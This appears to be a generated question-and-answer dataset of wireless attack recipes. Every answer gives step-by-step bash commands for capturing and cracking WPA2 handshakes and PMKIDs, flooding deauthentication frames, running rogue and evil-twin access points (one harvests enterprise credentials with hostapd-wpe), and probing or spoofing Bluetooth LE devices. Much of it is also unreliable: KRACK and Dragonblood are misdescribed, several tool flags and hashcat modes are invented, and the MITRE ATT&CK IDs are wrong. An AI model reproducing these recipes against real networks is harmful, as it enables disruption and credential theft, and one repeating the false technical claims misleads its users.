sudo airodump-ng -c <channel> --bssid <BSSID> -w pmkid_capture wlan0mon
```

**Expected Artifacts/Telemetry:**
- Captured .cap files with PMKIDs.
- Wireshark can be used to verify if PMKIDs are captured.

**Cleanup Steps:**
```bash
sudo airmon-ng stop wlan0mon
rm pmkid_capture*
```
===PAIR===
Q: How can I perform a WPA3 Dragonblood attack?
A: **Technique: WPA3 Dragonblood Attack \u2014 T1595.001**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Discover target network and clients:**
```bash
sudo airodump-ng wlan0mon --encrypt wpa3
# Note the BSSID, channel, and MAC addresses of the target clients.
```

**Step 3 \u2014 Capture Dragonblood packets:**
```bash
sudo airodump-ng -c <channel> --bssid <BSSID> -w dragonblood_capture wlan0mon
```

**Expected Artifacts/Telemetry:**
- Captured .cap files with Dragonblood packets.
- Wireshark can be used to verify if Dragonblood packets are captured.

**Cleanup Steps:**
```bash
sudo airmon-ng stop wlan0mon
rm dragonblood_capture*
```

=== BATCH 35 RETRY 0 ===
===PAIR===
Q: Can you perform a WPA2 handshake capture on a target network?
A: **Technique: WPA2 Handshake Capture \u2014 T1595.001 (WPA/WPA2 deauthentication attacks)**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
```

**Step 2 \u2014 Deauthentication attack to capture handshake:**  
```bash
# Deauthenticate a client to force re-authentication
sudo aireplay-ng -0 5 -a <target_BSSID> -c <client_MAC> wlan0mon

# Capture the handshake with airodump-ng
sudo airodump-ng --bssid <target_BSSID> --write capture wlan0mon
```

**Artifacts:**  
- Captured .cap file containing WPA2 handshake.
- Network monitoring: increased activity around target BSSID.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture.*
```
===PAIR===
Q: How can I set up a rogue access point to intercept traffic?
A: **Technique: Rogue Access Point Setup \u2014 T1590.001 (Evil Twin AP)**

**Step 1 \u2014 Configure wireless interface:**  
```bash
# Put wireless adapter in managed mode
sudo ip link set wlan0 down
sudo iwconfig wlan0 mode managed
sudo ip link set wlan0 up
```

**Step 2 \u2014 Start the rogue access point:**  
```bash
# Install hostapd and dnsmasq
sudo apt install hostapd dnsmasq

# Configure hostapd
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=RogueAP
hw_mode=g
channel=6
wpa=2
wpa_passphrase=roguepass
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# Start hostapd and dnsmasq
sudo hostapd /tmp/hostapd.conf &
sudo dnsmasq -C /etc/dnsmasq.conf
```

**Artifacts:**  
- Wireless IDS: new AP with ESSID "RogueAP".
- Network monitoring: clients connecting to the rogue AP.

**Cleanup:**  
```bash
sudo killall hostapd
sudo killall dnsmasq
rm /tmp/hostapd.conf
```
===PAIR===
Q: What is a KRACK attack, and how can I perform it?
A: **Technique: KRACK (Key Reinstallation Attacks) \u2014 T1595.001 (WPA/WPA2 deauthentication attacks)**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
```

**Step 2 \u2014 Deauthentication attack to trigger rekeying:**  
```bash
# Deauthenticate a client to force re-authentication and rekeying
sudo aireplay-ng -0 5 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Step 3 \u2014 Capture the traffic with airodump-ng:**  
```bash
# Capture packets for analysis
sudo airodump-ng --bssid <target_BSSID> --write capture wlan0mon
```

**Artifacts:**  
- Captured .cap file containing rekeyed frames.
- Network monitoring: increased activity around target BSSID.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture.*
```
===PAIR===
Q: How can I perform PMKID attacks on a WPA2 network?
A: **Technique: PMKID Attacks \u2014 T1595.001 (WPA/WPA2 deauthentication attacks)**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
```

**Step 2 \u2014 Capture PMKIDs with airodump-ng:**  
```bash
# Start capturing PMKIDs
sudo airodump-ng --bssid <target_BSSID> --write capture wlan0mon -wpmkid=1
```

**Artifacts:**  
- Captured .cap file containing PMKID values.
- Network monitoring: increased activity around target BSSID.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture.*
```
===PAIR===
Q: What are some RF-based attacks I can perform on wireless networks?
A: **Technique: RF Jamming and Replay Attacks \u2014 T1595.001 (WPA/WPA2 deauthentication attacks)**

**Step 1 \u2014 RF Jamming:**  
```bash
# Install linssid for jamming
sudo apt install linssid

# Start linssid and select a channel to jam
linssid
```

**Step 2 \u2014 Replay Attack with aireplay-ng:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2

# Deauthenticate and replay packets
sudo aireplay-ng -0 5 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Artifacts:**  
- Network monitoring: jamming events, deauthentication/reassociation.
- Client logs: connectivity issues.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I perform a WPA3 Dragonblood attack?
A: **Technique: WPA3 Dragonblood Attack \u2014 T1595.001 (WPA/WPA2 deauthentication attacks)**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa3
```

**Step 2 \u2014 Deauthentication attack to capture Dragonblood handshake:**  
```bash
# Deauthenticate a client to force re-authentication
sudo aireplay-ng -0 5 -a <target_BSSID> -c <client_MAC> wlan0mon

# Capture the handshake with airodump-ng
sudo airodump-ng --bssid <target_BSSID> --write capture wlan0mon
```

**Artifacts:**  
- Captured .cap file containing WPA3 Dragonblood handshake.
- Network monitoring: increased activity around target BSSID.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture.*
```

=== BATCH 36 RETRY 0 ===
===PAIR===
Q: How can I capture a WPA2 handshake to perform offline cracking?
A: **Technique: WPA2 Handshake Capture \u2014 T1595.001 (Handshake Capture)**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Discover target network:**
```bash
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 3 \u2014 Start capturing packets:**
```bash
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon --write=handshake
```

**Expected Artifacts/Telemetry:**
- Captured handshake file (e.g., `handshake.cap`).
- IDS alerts for increased traffic or unusual patterns.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm handshake.*
```
===PAIR===
Q: What is a method to deauthenticate all clients from a WPA/WPA2 network?
A: **Technique: Deauthentication Attack \u2014 T1590.001 (Deauth)**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Discover target network:**
```bash
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 3 \u2014 Deauthenticate all clients:**
```bash
sudo aireplay-ng -0 10 -a <BSSID> wlan0mon
```

**Expected Artifacts/Telemetry:**
- Network IDS alerts for multiple deauthentication events.
- Clients reconnecting to the network.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I set up a rogue access point with WPA2 PSK?
A: **Technique: Rogue Access Point \u2014 T1590.001 (Rogue AP)**

**Step 1 \u2014 Configure wireless interface:**
```bash
sudo ip link set wlan0 down
sudo iwconfig wlan0 mode managed
sudo ip link set wlan0 up
```

**Step 2 \u2014 Start the rogue access point:**
```bash
sudo hostapd -B /etc/hostapd/hostapd.conf
# Example hostapd.conf:
interface=wlan0
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa=2
wpa_passphrase=roguepassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
```

**Expected Artifacts/Telemetry:**
- Network IDS alerts for new APs with the same SSID.
- Clients associating to the rogue AP.

**Cleanup:**
```bash
sudo killall hostapd
```
===PAIR===
Q: Describe a method to perform a KRACK attack on a WPA2 network.
A: **Technique: Key Reinstallation Attack (KRACK) \u2014 T1590.001 (KRACK)**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Discover target network:**
```bash
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 3 \u2014 Perform the KRACK attack:**
```bash
sudo aireplay-ng -0 10 -a <BSSID> -c <client_MAC> wlan0mon
```

**Expected Artifacts/Telemetry:**
- Network IDS alerts for retransmitted packets.
- Potential data loss or corruption on the client.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I capture and crack PMKIDs from a WPA2 network?
A: **Technique: PMKID Capture \u2014 T1595.001 (PMKID Capture)**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Start capturing PMKIDs:**
```bash
sudo airodump-ng --bssid <BSSID> -c <channel> --wps=on --output-format=csv wlan0mon > pmkid.csv
```

**Expected Artifacts/Telemetry:**
- CSV file containing captured PMKIDs.
- IDS alerts for increased WPS packets.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm pmkid.csv
```
===PAIR===
Q: What is a method to perform a Bluetooth Low Energy (BLE) scan and attack?
A: **Technique: BLE Scan and Attack \u2014 T1590.001 (BLE)**

**Step 1 \u2014 Perform a BLE scan:**
```bash
sudo hcitool lescan
```

**Step 2 \u2014 Connect to a target device:**
```bash
gatttool -b <target_MAC> --interactive
# Example commands:
[CONNECTION]> connect
[CONNECTION]> characteristics
```

**Expected Artifacts/Telemetry:**
- BLE IDS alerts for new devices and connections.
- Potential data exchange with the target device.

**Cleanup:**
```bash
sudo hciconfig hci0 down
sudo hciconfig hci0 up
```

=== BATCH 37 RETRY 0 ===
===PAIR===
Q: How can I capture a WPA2 handshake and perform an offline crack?
A: **Technique: WPA2 Handshake Capture and Offline Cracking \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
```
Note the BSSID, channel, and ESSID of the target network.

**Step 2 \u2014 Capture Handshake:**
```bash
# Start capturing packets to a file
sudo airodump-ng -c <channel> -w capture wlan0mon --bssid <BSSID>
```
Wait until you see "WPA handshake" in the output for your target.

**Step 3 \u2014 Crack Handshake:**
```bash
# Use a wordlist to crack the captured handshake
aircrack-ng -w /path/to/wordlist.txt capture-01.cap
```

**Artifacts:** 
- Captured .cap files in the directory.
- Cracked password if successful.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: What is a good method to deauthenticate clients from a WPA/WPA2 network?
A: **Technique: Deauthentication Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network and clients
sudo airodump-ng wlan0mon --encrypt wpa,wpa2
```
Note the BSSID, channel, ESSID of the target network, and MAC addresses of connected clients.

**Step 2 \u2014 Deauthentication:**
```bash
# Send deauthentication packets to all clients
sudo aireplay-ng -0 10 -a <BSSID> wlan0mon
```

**Artifacts:** 
- Clients reconnecting to the network.
- Network monitoring tools showing disconnection events.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I set up a rogue access point during a penetration test?
A: **Technique: Rogue Access Point Setup \u2014 T1590.001**

**Step 1 \u2014 Configure Network Interface:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Change to managed mode for the new AP
sudo iwconfig wlan0 mode Managed
```

**Step 2 \u2014 Start Hostapd and Dhcpd:**
```bash
# Configure hostapd
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=RogueAP
hw_mode=g
channel=6
wpa=2
wpa_passphrase=roguepassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# Start hostapd and dhcpd
sudo hostapd /tmp/hostapd.conf &
sudo dhcpd -cf /etc/dhcp/dhcpd.conf wlan0
```

**Artifacts:** 
- New AP visible in wireless scans.
- Devices connecting to "RogueAP".

**Cleanup:**
```bash
sudo killall hostapd dhcpd
sudo airmon-ng stop wlan0mon
rm /tmp/hostapd.conf
```
===PAIR===
Q: Describe a method for performing an Evil Twin attack on WPA2 Enterprise networks.
A: **Technique: Evil Twin Attack (WPA2 Enterprise) \u2014 T1590.001**

**Step 1 \u2014 Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
```
Note the BSSID, channel, ESSID of the target Enterprise network.

**Step 2 \u2014 Set up fake RADIUS server:**
```bash
# Install hostapd-wpe (Wireless Pawn Edition)
sudo apt install hostapd-wpe

# Configure hostapd-wpe
cat > /tmp/hostapd-wpe.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=CorporateWiFi
hw_mode=g
channel=6
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/ca.pem
server_cert=/etc/hostapd-wpe/server.pem
private_key=/etc/hostapd-wpe/server.key
dh_file=/etc/hostapd-wpe/dh.pem
EOF
```

**Step 3 \u2014 Start the evil twin AP:**
```bash
# Start access point
sudo hostapd-wpe /tmp/hostapd-wpe.conf

# Captured credentials are logged to:
# /etc/hostapd-wpe/hostapd-wpe.log
```

**Step 4 \u2014 Deauthenticate legitimate clients:**
```bash
# Force clients to reconnect to evil twin
sudo aireplay-ng -0 10 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Artifacts:** 
- Wireless IDS: multiple APs with same ESSID (BSSID mismatch)
- RADIUS logs: authentication attempts from unknown NAS
- Network monitoring: channel change events, signal strength anomalies
- Client logs: certificate warnings (if checking)

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl stop hostapd-wpe
rm /tmp/hostapd-wpe.conf
```
===PAIR===
Q: How can I use PMKID attacks to crack WPA2 passwords?
A: **Technique: PMKID Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network and clients
sudo airodump-ng wlan0mon --encrypt wpa2
```
Note the BSSID, channel, ESSID of the target network.

**Step 2 \u2014 Capture PMKIDs:**
```bash
# Start capturing packets to a file
sudo airodump-ng -c <channel> -w capture wlan0mon --bssid <BSSID>
```
Wait until you see "WPA handshake" in the output for your target.

**Step 3 \u2014 Crack PMKIDs:**
```bash
# Use a wordlist to crack the captured PMKIDs
aircrack-ng -w /path/to/wordlist.txt capture-01.cap
```

**Artifacts:** 
- Captured .cap files in the directory.
- Cracked password if successful.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: What is a good method to perform Bluetooth Low Energy (BLE) scanning and attacks?
A: **Technique: BLE Scanning and Attacks \u2014 T1590.001**

**Step 1 \u2014 Scan for BLE Devices:**
```bash
# Use hcitool or bluetoothctl to scan for devices
hcitool lescan
```
or
```bash
bluetoothctl power on
bluetoothctl scan on
```

**Step 2 \u2014 Connect and Gather Information:**
```bash
# Connect to a BLE device
gatttool -b <device_address> --interactive
# Commands like "primary" or "characteristics" can be used to gather more info.
```

**Artifacts:** 
- Device addresses, names, and characteristics.
- Potential vulnerabilities based on gathered information.

**Cleanup:**
```bash
bluetoothctl scan off
```
or
```bash
gatttool -b <device_address> --exit
```

=== BATCH 38 RETRY 0 ===
===PAIR===
Q: How can I capture WPA2 handshakes for offline cracking?
A: **Technique: WPA2 Handshake Capture \u2014 T1595.001**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Discover target network and clients:**
```bash
sudo airodump-ng wlan0mon --encrypt wpa2
# Note the BSSID, channel, and ESSID of the target network.
```

**Step 3 \u2014 Start capturing handshakes:**
```bash
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon -w captured_handshake
```

**Expected Artifacts/Telemetry:**
- Captured files: `captured_handshake-<number>.cap`
- Network monitoring: Increased activity around the target network.

**Cleanup Steps:**
```bash
sudo airmon-ng stop wlan0mon
rm captured_handshake*
```

===PAIR===
Q: What is a good method to perform deauthentication attacks on WPA/WPA2 networks?
A: **Technique: Deauthentication Attack \u2014 T1590.001**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Discover target network and clients:**
```bash
sudo airodump-ng wlan0mon --encrypt wpa2
# Note the BSSID, channel, and client MAC addresses.
```

**Step 3 \u2014 Perform deauthentication attack:**
```bash
sudo aireplay-ng -0 10 -a <BSSID> -c <client_MAC> wlan0mon
```

**Expected Artifacts/Telemetry:**
- Network monitoring: Clients reconnecting to the network.
- IDS/IPS alerts: Multiple disconnection events.

**Cleanup Steps:**
```bash
sudo airmon-ng stop wlan0mon
```

===PAIR===
Q: How can I set up a rogue access point during penetration testing?
A: **Technique: Rogue Access Point Setup \u2014 T1590.001**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Configure hostapd for the rogue AP:**
```bash
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa=2
wpa_passphrase=roguepassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
```

**Step 3 \u2014 Start the rogue AP:**
```bash
sudo hostapd /tmp/hostapd.conf &
```

**Expected Artifacts/Telemetry:**
- Wireless IDS: New SSID visible.
- Network monitoring: Clients associating with the new network.

**Cleanup Steps:**
```bash
sudo airmon-ng stop wlan0mon
sudo killall hostapd
rm /tmp/hostapd.conf
```

===PAIR===
Q: Can you explain how to perform a KRACK attack and what tools are needed?
A: **Technique: Key Reinstallation Attack (KRACK) \u2014 T1595.001**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Discover target network and clients:**
```bash
sudo airodump-ng wlan0mon --encrypt wpa2
# Note the BSSID, channel, and client MAC addresses.
```

**Step 3 \u2014 Perform KRACK attack:**
```bash
sudo aireplay-ng -0 10 -a <BSSID> -c <client_MAC> wlan0mon
```

**Expected Artifacts/Telemetry:**
- Network monitoring: Clients reconnecting to the network.
- IDS/IPS alerts: Multiple disconnection events.

**Cleanup Steps:**
```bash
sudo airmon-ng stop wlan0mon
```

===PAIR===
Q: How can I use PMKID attacks for WPA2 during penetration testing?
A: **Technique: PMKID Attack \u2014 T1595.001**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Start capturing PMKIDs:**
```bash
sudo airodump-ng --bssid <BSSID> -c <channel> --write=pmkid_capture wlan0mon
# Wait until you capture enough PMKIDs.
```

**Step 3 \u2014 Crack the captured PMKIDs:**
```bash
aircrack-ng pmkid_capture-<number>.cap
```

**Expected Artifacts/Telemetry:**
- Captured files: `pmkid_capture-<number>.cap`
- Network monitoring: Increased activity around the target network.

**Cleanup Steps:**
```bash
sudo airmon-ng stop wlan0mon
rm pmkid_capture*
```

===PAIR===
Q: What is a good way to perform Bluetooth Low Energy (BLE) attacks during penetration testing?
A: **Technique: BLE Advertising Spoofing \u2014 T1590.001**

**Step 1 \u2014 Scan for nearby BLE devices:**
```bash
sudo hcitool lescan
```

**Step 2 \u2014 Stop the default BLE advertising:**
```bash
sudo hciconfig hci0 noscan
```

**Step 3 \u2014 Start spoofing a BLE device:**
```bash
sudo gatttool -b <target_device_address> --char-write-req -a 0x0008 -n 01
# Adjust the handle (0x0008) and value (01) based on the target device.
```

**Expected Artifacts/Telemetry:**
- Bluetooth devices: Nearby devices may connect to or interact with the spoofed device.

**Cleanup Steps:**
```bash
sudo hciconfig hci0 scan
# Optionally, reset the BLE device if needed.
```

=== BATCH 39 RETRY 0 ===
===PAIR===
Q: How can I perform a WPA2 handshake capture and offline cracking on a target network?
A: **Technique: WPA2 Handshake Capture and Offline Cracking \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Capture the handshake:**  
```bash
# Start capturing packets from the target network
sudo airodump-ng -c <channel> -d <BSSID> --bssid <BSSID> -w capture wlan0mon
```

**Step 3 \u2014 Deauthenticate a client to force a new handshake:**  
```bash
# Deauthenticate a client
sudo aireplay-ng -0 1 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 4 \u2014 Crack the captured WPA2 PSK using a wordlist:**  
```bash
# Use aircrack-ng to crack the handshake
sudo aircrack-ng -w /path/to/wordlist.txt capture-01.cap
```

**Artifacts:**  
- Captured .cap file with handshakes.
- Cracked PSK if successful.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: What is a good method to detect rogue access points in a network?
A: **Technique: Rogue Access Point Detection \u2014 T1590.001**

**Step 1 \u2014 Scan the area for all wireless networks:**  
```bash
# Put wireless adapter in managed mode
sudo ip link set wlan0 down
sudo iwconfig wlan0 mode managed
sudo ip link set wlan0 up

# Perform a scan
iwlist wlan0 scanning | grep -i "ssid"
```

**Step 2 \u2014 Compare with known networks:**  
```bash
# List of known SSIDs (example)
known_ssids=("NetworkA" "NetworkB")

# Check for unknown SSIDs
for ssid in $(iwlist wlan0 scanning | grep -oP '(?<=ESSID:").*(?=")'); do
    if [[ ! "${known_ssids[@]}" =~ "$ssid" ]]; then
        echo "Unknown network detected: $ssid"
    fi
done
```

**Artifacts:**  
- List of all SSIDs in the area.
- Identified unknown networks.

**Cleanup:**  
No additional cleanup required unless changes were made to wireless settings.
===PAIR===
Q: How can I perform a WPA3 Dragonblood attack?
A: **Technique: WPA3 Dragonblood Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa3
# Note: BSSID, channel, ESSID of target WPA3 network
```

**Step 2 \u2014 Set up the attacker's AP:**  
```bash
# Configure hostapd for Dragonblood attack
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=TargetSSID
hw_mode=g
channel=6
wpa=3
wpa_key_mgmt=SAE
rsn_pairwise=CCMP
sae_groups=19 20 21 25 26 27 28 29 30 31
EOF

# Start hostapd
sudo hostapd /tmp/hostapd.conf
```

**Step 3 \u2014 Deauthenticate legitimate clients:**  
```bash
# Force clients to reconnect to attacker's AP
sudo aireplay-ng -0 10 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Artifacts:**  
- Wireless IDS: multiple APs with same ESSID (BSSID mismatch).
- Network monitoring: channel change events, signal strength anomalies.
- Client logs: SAE authentication attempts.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl stop hostapd
rm /tmp/hostapd.conf
```
===PAIR===
Q: How can I perform a PMKID attack for WPA2?
A: **Technique: PMKID Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target WPA2 network
```

**Step 2 \u2014 Capture PMKIDs:**  
```bash
# Start capturing packets from the target network
sudo airodump-ng -c <channel> -d <BSSID> --bssid <BSSID> -w capture wlan0mon
```

**Step 3 \u2014 Deauthenticate multiple clients to increase PMKID count:**  
```bash
# Deauthenticate multiple clients
sudo aireplay-ng -0 5 -a <BSSID> wlan0mon
```

**Step 4 \u2014 Use hashcat to crack the captured PMKIDs with a wordlist:**  
```bash
# Convert .cap file to .hccapx format
aircrack-ng capture-01.cap -J output

# Crack using hashcat
hashcat -m 25425 output.hccapx /path/to/wordlist.txt
```

**Artifacts:**  
- Captured .cap and .hccapx files.
- Cracked PSK if successful.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
rm output.*
```
===PAIR===
Q: What is a good way to detect KRACK (Key Reinstallation Attacks) in a network?
A: **Technique: KRACK Detection \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target WPA2 network
```

**Step 2 \u2014 Capture packets:**  
```bash
# Start capturing packets from the target network
sudo airodump-ng -c <channel> -d <BSSID> --bssid <BSSID> -w capture wlan0mon
```

**Step 3 \u2014 Analyze captured packets for KRACK indicators:**  
```bash
# Use tshark to filter and display potential KRACK frames
tshark -r capture-01.cap 'wlan.fc.retry == 1' | grep "Data"
```

**Artifacts:**  
- Captured .cap file with potential KRACK frames.
- Tshark output showing retransmitted data frames.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: How can I perform a Bluetooth Low Energy (BLE) scan and service discovery?
A: **Technique: BLE Scan and Service Discovery \u2014 T1590.001**

**Step 1 \u2014 Perform a BLE scan:**  
```bash
# Use hcitool to scan for nearby BLE devices
hcitool lescan
```

**Step 2 \u2014 Discover services of a specific device:**  
```bash
# Replace 'XX:XX:XX:XX:XX:XX' with the target device's MAC address
gatttool -b XX:XX:XX:XX:XX:XX --primary
```

**Artifacts:**  
- List of BLE devices and their MAC addresses.
- Primary services discovered for each device.

**Cleanup:**  
No additional cleanup required unless changes were made to Bluetooth settings.

=== BATCH 40 RETRY 0 ===
===PAIR===
Q: How can I perform a WPA2 handshake capture and offline cracking?
A: **Technique: WPA2 Handshake Capture and Offline Cracking — T1590.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Capture the handshake:**
```bash
# Start capturing packets
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

# Deauthenticate a client to force a new handshake
sudo aireplay-ng -0 1 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 3 — Crack the captured handshake:**
```bash
# Use John the Ripper or Hashcat to crack the WPA2 password
john --wordlist=rockyou.txt capture-01.cap
# Or with Hashcat
hashcat -m 2500 capture-01.cap rockyou.txt
```

**Artifacts:**
- Captured .cap file containing the handshake.
- Cracked password stored in the respective tool's output.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: What is a KRACK attack, and how can I perform it?
A: **Technique: Key Reinstallation Attack (KRACK) — T1595.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Deauthenticate the client:**
```bash
# Force clients to reconnect
sudo aireplay-ng -0 1 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 3 — Capture packets and analyze for KRACK:**
```bash
# Start capturing packets
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

# Use Wireshark or tshark to analyze the captured packets for retransmissions of the same key.
tshark -r capture-01.cap "wlan.fc.retry == 1"
```

**Artifacts:**
- Captured .cap file with potential KRACK indicators.
- Wireshark/tshark output showing retransmitted keys.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: How can I perform a PMKID attack on a WPA2 network?
A: **Technique: Pre-Shared Key Identifier (PMKID) Attack — T1590.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Capture PMKIDs:**
```bash
# Start capturing packets with hcxpcapngtool
hcxpcapngtool -o output.pcapng wlan0mon
```

**Step 3 — Crack the captured PMKIDs:**
```bash
# Use hashcat to crack the PMKIDs
hashcat -m 16800 output.pcapng rockyou.txt
```

**Artifacts:**
- Captured .pcapng file containing PMKIDs.
- Cracked passwords stored in the respective tool's output.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm output*
```
===PAIR===
Q: What are some common wireless network reconnaissance techniques?
A: **Technique: Wireless Network Reconnaissance — T1546**

**Step 1 — Scan for networks:**
```bash
# Use nmap to scan for wireless devices
sudo nmap -sn --script broadcast-dns-sd

# Or use airodump-ng to list all visible networks
sudo airodump-ng wlan0mon
```

**Step 2 — Analyze signal strength and channels:**
```bash
# Use kismet to visualize network activity
kismet

# Or use netdiscover for ARP scanning on the detected network
netdiscover -i wlan0mon
```

**Artifacts:**
- Network list with BSSID, ESSID, channel, and signal strength.
- Device IP addresses and MAC addresses.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
# For kismet, you can use `kismet_capture` to stop the capture manually.
```
===PAIR===
Q: How can I set up a rogue access point during penetration testing?
A: **Technique: Rogue Access Point Setup — T1595.001**

**Step 1 — Configure wireless interface:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Change to managed mode on another interface for AP setup
